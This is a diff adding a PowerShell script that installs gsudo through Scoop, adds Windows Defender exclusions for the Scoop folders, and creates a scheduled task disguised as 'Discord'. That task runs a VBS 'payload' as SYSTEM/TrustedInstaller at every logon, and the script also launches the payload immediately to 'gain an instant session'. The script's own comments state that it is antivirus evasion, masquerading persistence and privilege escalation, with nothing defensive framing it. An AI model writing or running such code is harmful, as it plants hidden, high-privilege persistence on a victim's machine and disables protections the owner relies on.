@@ -1,0 +1,29 @@
+# Set global encoding to prevent character corruption
+$OutputEncoding = [System.Text.Encoding]::UTF8
+[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+
+# 1. Configure AV exclusion for Scoop installation paths
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\scoop", "$env:ProgramData\scoop"
+
+# 2. Silently install gsudo via Scoop
+scoop install gsudo -y
+
+# 2.5 [CRITICAL FIX] Dynamically refresh environment variables ($env:Path) in current session
+# This allows the subsequent commands to locate gsudo.exe immediately without restarting the shell
+try {
+    $env:Path = [Environment]::GetEnvironmentVariable("Path", "User") + ";" + [Environment]::GetEnvironmentVariable("Path", "Machine")
+
+    # Fallback check: manually append Scoop shims directory if gsudo command is still not recognized
+    if (!(Get-Command gsudo -ErrorAction SilentlyContinue)) {
+        $env:Path += ";$env:USERPROFILE\scoop\shims"
+    }
+} catch {
+    Write-Host "Error"
+}
+
+# 3. Create a persistent scheduled task masquerading as "Discord" (Runs under TrustedInstaller/SYSTEM at logon)
+gsudo -s --ti cmd.exe /c schtasks /create /tn "Discord" /tr "wscript.exe \"C:\uptm\auto_host.vbs\"" /sc onlogon /ru "SYSTEM" /f
+
+# 4. Trigger the payload script immediately with highest privileges to gain an instant session without waiting for reboot
+# Note: Ensure C:\uptm\auto_host.vbs has been pre-staged or downloaded prior to this step
+gsudo -s --ti wscript.exe "C:\uptm\auto_host.vbs"
